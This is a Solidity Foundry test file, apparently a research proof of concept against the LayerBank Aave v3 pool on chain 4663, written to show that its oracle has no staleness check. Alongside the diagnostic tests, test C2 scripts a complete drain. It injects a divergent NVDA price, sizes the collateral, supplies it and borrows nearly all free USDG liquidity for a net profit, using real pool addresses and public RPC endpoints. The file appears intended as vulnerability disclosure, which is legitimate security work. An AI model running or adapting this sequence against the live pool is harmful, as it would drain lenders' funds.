// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20, IPool, IOracle, IAggregator, IPoolAddressesProvider, IACLManager} from "../src/Interfaces.sol";

/// @title LayerBank (Robinhood Chain 4663) — AaveOracle staleness / no-heartbeat
/// @notice READ-ONLY research PoC. Runs on a LOCAL FORK of chain 4663 only.
///         No transaction is ever signed or broadcast to a live network.
///
/// Findings proven here:
///  A. The oracle is a stock `AaveOracle`: `getAssetPrice == source.latestAnswer()`, no `updatedAt`.
///  A2. The oracle performs NO staleness check — warping a full year does not change the price.
///  A3. Oracle bytecode contains `latestAnswer()` (0x50d25bcd) and NOT `latestRoundData()` (0xfeaf968c).
///  B. `supply` + `borrow` are PERMISSIONLESS (fresh EOA, no roles) against an equity collateral.
///  C1. At the REAL feed price the same borrow reverts (insufficient collateral).
///  C2. With a state-overridden (divergent) feed the borrow succeeds and nets a profit.
///  D. `borrow` is hard-capped by the reserve's free liquidity.
///  E. Exact break-even stale-vs-real gap per reserve = 1/LTV - 1.
contract LayerBankOracleTest is Test {
    // ---- chain 4663 addresses (verified via eth_getCode at block 97,805,494) ----
    address constant POOL   = 0x433e21dC2BF027910B1635653c2Eb630bC7dAD43; // Aave v3 Pool proxy (impl 0xb8ea4704fe518c5ccbf429fc6db1b2c4c4ca7193)
    address constant ORACLE = 0x0e1289335E72a9e1799D691Fc618656FA69F2ca1; // stock AaveOracle (not a proxy)
    address constant PROVIDER = 0x6758Efc446EE8BDE7670b93a6Df799dFfE8F8969;
    address constant ACLMGR = 0x569C94DD0e1c6Ec6E52B758054fE042C2623BE4E;

    address constant NVDA = 0xd0601CE157Db5bdC3162BbaC2a2C8aF5320D9EEC; // LTV 55% / LT 60% (collateral only)
    address constant SPY  = 0x117cc2133c37B721F49dE2A7a74833232B3B4C0C; // LTV 60% / LT 65% (collateral only)
    address constant USDG = 0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168; // LTV 80% / LT 85% (borrowable)
    address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73; // LTV 70% / LT 75% (borrowable)
    address constant SGOV = 0x92FD66527192E3e61d4DDd13322Aa222DE86F9B5; // LTV 70% / LT 75%

    address constant NVDA_FEED = 0x379EC4f7C378F34a1B47E4F3cbeBCbAC3E8E9F15; // "RHNVDA / USD", Chainlink EACAggregatorProxy
    address constant SPY_FEED  = 0x319724394D3A0e3669269846abE664Cd621f9f6A; // "RHSPY / USD"

    address constant A_USDG = 0xAd9b5C0ea95Cf998C1A31Aaa8aC7a24de94BeE69; // lRobUSDG
    address constant A_NVDA = 0x9286d5939F92254925d5849e1CE97Cb5f97783E7; // lRobNVDA (holds 85.49 NVDA)

    // DefiLlama reference prices (2026-10-25 ~18:54 UTC, coins.llama.fi) — 1e8 base
    uint256 constant REAL_NVDA_1E8 = 21215500000; // $212.155
    uint256 constant REAL_SPY_1E8  = 76079500000; // $760.795

    uint256 forkBlock;

    function setUp() public {
        string memory rpc = vm.envOr("RH_RPC_URL", string("https://4663.rpc.thirdweb.com"));
        vm.createSelectFork(rpc);
        forkBlock = block.number;
        console2.log("forked chain 4663 at block", forkBlock);
    }

    // ------------------------------------------------------------------ helpers
    function _contains(bytes memory hay, bytes4 needle) internal pure returns (bool) {
        if (hay.length < 4) return false;
        for (uint256 i = 0; i + 4 <= hay.length; i++) {
            if (hay[i] == needle[0] && hay[i + 1] == needle[1] && hay[i + 2] == needle[2] && hay[i + 3] == needle[3]) {
                return true;
            }
        }
        return false;
    }

    function _feedAge(address feed) internal view returns (uint256 age, int256 ans, uint256 updatedAt) {
        (, ans, , updatedAt, ) = IAggregator(feed).latestRoundData();
        age = block.timestamp - updatedAt;
    }

    function _freeLiquidity(address asset) internal view returns (uint256) {
        (, , , , , , , , address aToken, , , , , , ) = IPool(POOL).getReserveData(asset);
        return IERC20(asset).balanceOf(aToken);
    }

    /// @dev Fund `who` with `amount` of a token whose balances live in a `mapping(address=>uint256)`
    ///      (the RH equity tokens are ERC-1967 beacon proxies). The slot is discovered by matching
    ///      the balance of a known holder (the LayerBank aToken), then written directly.
    function _give(address token, address who, uint256 amount) internal {
        uint256 knownBal = IERC20(token).balanceOf(A_NVDA);
        for (uint256 s = 0; s < 256; s++) {
            bytes32 key = keccak256(abi.encode(A_NVDA, s));
            if (vm.load(token, key) == bytes32(knownBal) && knownBal > 0) {
                vm.store(token, keccak256(abi.encode(who, s)), bytes32(amount));
                require(IERC20(token).balanceOf(who) == amount, "give failed");
                return;
            }
        }
        // fallback: forge-std stdstore discovery
        deal(token, who, amount);
        require(IERC20(token).balanceOf(who) == amount, "give failed (fallback)");
    }

    // ------------------------------------------------------------------ A
    function test_A_oracle_is_stock_aaveoracle_passthrough() public {
        // oracle price must equal the raw feed answer (no transformation, no fallback)
        uint256 pNvda = IOracle(ORACLE).getAssetPrice(NVDA);
        uint256 pSpy = IOracle(ORACLE).getAssetPrice(SPY);
        assertEq(pNvda, uint256(IAggregator(NVDA_FEED).latestAnswer()), "NVDA passthrough");
        assertEq(pSpy, uint256(IAggregator(SPY_FEED).latestAnswer()), "SPY passthrough");
        assertEq(IOracle(ORACLE).BASE_CURRENCY_UNIT(), 1e8, "base unit 1e8 USD");
        assertEq(IOracle(ORACLE).getSourceOfAsset(NVDA), NVDA_FEED, "source of asset");

        (uint256 ageN, int256 aN, ) = _feedAge(NVDA_FEED);
        (uint256 ageS, int256 aS, ) = _feedAge(SPY_FEED);
        console2.log("NVDA feed age (s)", ageN);
        console2.log("SPY  feed age (s)", ageS);
        console2.logInt(aN);
        console2.logInt(aS);

        // the frozen print is essentially the tradeable price -> NO exploitable divergence.
        // (Staleness is intermittent: the feeds freeze only while the equity market is closed;
        //  the durable proof that the oracle *ignores* staleness is test_A1/test_A2/test_A3.)
        uint256 gapNvdaBps = pNvda > REAL_NVDA_1E8
            ? ((pNvda - REAL_NVDA_1E8) * 10000) / REAL_NVDA_1E8
            : ((REAL_NVDA_1E8 - pNvda) * 10000) / REAL_NVDA_1E8;
        uint256 gapSpyBps = pSpy > REAL_SPY_1E8
            ? ((pSpy - REAL_SPY_1E8) * 10000) / REAL_SPY_1E8
            : ((REAL_SPY_1E8 - pSpy) * 10000) / REAL_SPY_1E8;
        console2.log("NVDA oracle-vs-real gap (bps)", gapNvdaBps);
        console2.log("SPY  oracle-vs-real gap (bps)", gapSpyBps);
        assertLt(gapNvdaBps, 500, "no >5% divergence today");
        assertLt(gapSpyBps, 500, "no >5% divergence today");
    }

    /// @dev Pinned at the weekend-freeze block: the equity feeds are 46.9 h stale and the oracle
    ///      still returns the frozen print (this is the on-chain fact the whole finding rests on).
    ///      Uses a second RPC provider to avoid the primary endpoint's rate limit.
    function test_A1_historical_weekend_freeze_block_97805494() public {
        string memory rpc2 = vm.envOr("RH_RPC_URL2", string("https://robinhood.drpc.org"));
        vm.createSelectFork(rpc2, 97_805_494);
        (, int256 ansN, , uint256 updN, ) = IAggregator(NVDA_FEED).latestRoundData();
        uint256 ageN = block.timestamp - updN;
        console2.log("at block 97805494 NVDA feed age (s)", ageN);
        assertGt(ageN, 40 hours, "weekend freeze > 40 h");
        assertEq(uint256(ansN), IOracle(ORACLE).getAssetPrice(NVDA), "oracle returns the frozen print");
        // and the frozen print was still accurate (DefiLlama $212.155 vs oracle $211.1636 -> 0.47% low)
        assertLt((REAL_NVDA_1E8 - uint256(ansN)) * 10000 / REAL_NVDA_1E8, 500, "frozen print accurate");
    }

    function test_A2_no_staleness_check_warp_one_year() public {
        uint256 p0 = IOracle(ORACLE).getAssetPrice(NVDA);
        uint256 s0 = IOracle(ORACLE).getAssetPrice(USDG);
        // a stock AaveOracle keeps returning the frozen answer forever
        vm.warp(block.timestamp + 365 days);
        uint256 p1 = IOracle(ORACLE).getAssetPrice(NVDA);
        uint256 s1 = IOracle(ORACLE).getAssetPrice(USDG);
        assertEq(p1, p0, "price unchanged after +1y -> no freshness check");
        assertEq(s1, s0, "price unchanged after +1y -> no freshness check");
        console2.log("price after +365d unchanged", p1);
    }

    function test_A3_oracle_bytecode_uses_latestAnswer_only() public {
        bytes memory code = ORACLE.code;
        assertTrue(_contains(code, bytes4(0x50d25bcd)), "latestAnswer() present");
        assertFalse(_contains(code, bytes4(0xfeaf968c)), "latestRoundData() absent -> no updatedAt read");
        // feeds themselves are Chainlink EACAggregatorProxy -> OCR push feeds, not manipulable
        assertTrue(_contains(NVDA_FEED.code, bytes4(0x245a7bfc)), "feed is a Chainlink aggregator proxy");
    }

    // ------------------------------------------------------------------ B
    function test_B_permissionless_supply_borrow_equity_collateral() public {
        address attacker = address(0xA11CE);
        assertFalse(IACLManager(ACLMGR).isPoolAdmin(attacker), "attacker has no role");
        _give(NVDA, attacker, 100e18);

        vm.startPrank(attacker);
        IERC20(NVDA).approve(POOL, type(uint256).max);
        IPool(POOL).supply(NVDA, 100e18, attacker, 0);
        IPool(POOL).borrow(USDG, 1_000e6, 2, 0, attacker);
        vm.stopPrank();

        assertEq(IERC20(USDG).balanceOf(attacker), 1_000e6, "permissionless borrow succeeded");
        (, , , , , uint256 hf) = IPool(POOL).getUserAccountData(attacker);
        console2.log("attacker HF after borrow (1e18)", hf);
        assertGt(hf, 1e18, "healthy");
    }

    // ------------------------------------------------------------------ C
    function test_C1_real_feed_borrow_over_ltv_reverts() public {
        address attacker = address(0xB0B);
        _give(NVDA, attacker, 100e18);
        vm.startPrank(attacker);
        IERC20(NVDA).approve(POOL, type(uint256).max);
        IPool(POOL).supply(NVDA, 100e18, attacker, 0);
        // 100 NVDA @ $211.16 x 55% LTV = ~$11,614 max borrow -> 20,000 must revert
        vm.expectRevert();
        IPool(POOL).borrow(USDG, 20_000e6, 2, 0, attacker);
        vm.stopPrank();
        console2.log("borrow over LTV at the REAL feed reverted as expected");
    }

    /// @dev The conditional mechanism: a feed that diverges from the real price lets an
    ///      attacker buy collateral at R, supply it at O, borrow LTV*O and default.
    ///      Here the divergence is injected with vm.mockCall (equivalent to a frozen feed
    ///      that diverges from the live market). 150% gap (O = 2.5*R).
    function test_C2_divergent_feed_extracts_free_liquidity() public {
        address attacker = address(0xCAFE);
        uint256 realR = 211.16e8; // $211.16 (DefiLlama)
        uint256 O = (realR * 25) / 10; // 2.5x => +150% stale-vs-real gap

        // inject the divergence at the FEED (this is what a frozen/dead feed does over time)
        vm.mockCall(NVDA_FEED, abi.encodeWithSelector(IAggregator.latestAnswer.selector), abi.encode(int256(O)));

        uint256 freeUsdg = _freeLiquidity(USDG); // 1e6 (USDG units)
        console2.log("free USDG liquidity (1e6)", freeUsdg);

        // size the collateral so that LTV*O*Q == free liquidity (cost = Q*R).
        // value_1e8 = Q*O/1e18 ; maxBorrow_1e8 = value_1e8*LTV/1e4 ; maxBorrow_1e6 = maxBorrow_1e8/100
        // => Q = freeUsdg * 100 * 1e18 / (LTV * O)
        uint256 q = (freeUsdg * 100 * 1e18) / ((O * 5500) / 10000);
        uint256 costR = (q * realR) / 1e18 / 100; // USDG 1e6 units
        console2.log("collateral Q (1e18)", q);
        console2.log("cost at real price (1e6 USDG)", costR);

        _give(NVDA, attacker, q);
        vm.startPrank(attacker);
        IERC20(NVDA).approve(POOL, type(uint256).max);
        IPool(POOL).supply(NVDA, q, attacker, 0);
        (, , uint256 avail, , , ) = IPool(POOL).getUserAccountData(attacker);
        uint256 availUsd = avail / 100; // 1e8 base -> 1e6 USDG units
        uint256 borrowAmt = availUsd < freeUsdg ? availUsd : freeUsdg;
        IPool(POOL).borrow(USDG, borrowAmt, 2, 0, attacker);
        vm.stopPrank();

        uint256 net = borrowAmt - costR;
        console2.log("borrowed (1e6 USDG)", borrowAmt);
        console2.log("NET profit (1e6 USDG)", net);
        // the attacker drains (essentially) the ENTIRE free USDG liquidity of the reserve
        assertGe(borrowAmt, (freeUsdg * 999) / 1000, "borrowed ~all free USDG liquidity");
        assertGt(net, 0, "net positive at a 150% gap");
    }

    // ------------------------------------------------------------------ D
    function test_D_borrow_capped_by_free_liquidity() public {
        address attacker = address(0xDEAD2);
        // huge collateral so the LTV is not the binding constraint
        uint256 q = 10_000e18;
        _give(NVDA, attacker, q);
        vm.startPrank(attacker);
        IERC20(NVDA).approve(POOL, type(uint256).max);
        IPool(POOL).supply(NVDA, q, attacker, 0);
        uint256 free = _freeLiquidity(USDG);
        vm.expectRevert();
        IPool(POOL).borrow(USDG, free + 1, 2, 0, attacker);
        vm.stopPrank();
        console2.log("borrow(free+1) reverted -> hard liquidity cap (1e6)", free);
    }

    // ------------------------------------------------------------------ E
    function test_E_break_even_gap_per_reserve() public {
        // gap needed for profit g = 1/LTV - 1
        assertEq(_gapBps(5500), 8181, "NVDA 55% -> 81.8%");
        assertEq(_gapBps(6000), 6666, "SPY 60% -> 66.7%");
        assertEq(_gapBps(7000), 4285, "SGOV/WETH/cbBTC 70% -> 42.9%");
        assertEq(_gapBps(8000), 2500, "USDG 80% -> 25.0%");
        assertEq(_gapBps(5000), 10000, "QQQ 50% -> 100%");
    }

    function _gapBps(uint256 ltvBps) internal pure returns (uint256) {
        return ((10_000 - ltvBps) * 10_000) / ltvBps;
    }
}
